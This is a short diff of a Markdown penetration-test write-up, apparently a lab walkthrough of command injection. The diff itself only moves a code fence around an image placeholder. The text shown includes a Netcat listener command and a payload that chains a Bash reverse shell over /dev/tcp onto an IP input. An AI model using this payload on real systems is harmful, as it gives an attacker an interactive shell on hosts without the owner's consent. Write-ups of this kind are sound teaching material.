@@ -52,10 +52,10 @@ By appending an operator payload, the system command syntax was hijacked.
 1. A Netcat listener was established on the attacker host:
    ```bash
    nc -lvnp 4444
+   ```
    <!-- 🖼️ PLACE THIRD IMAGE HERE -->
 ![Initial Access Foothold](images/foothold_lvl2.png)
 *Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
-   ```
 2. The following unified logical payload was delivered through the execution processing script:
    ```text
    192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
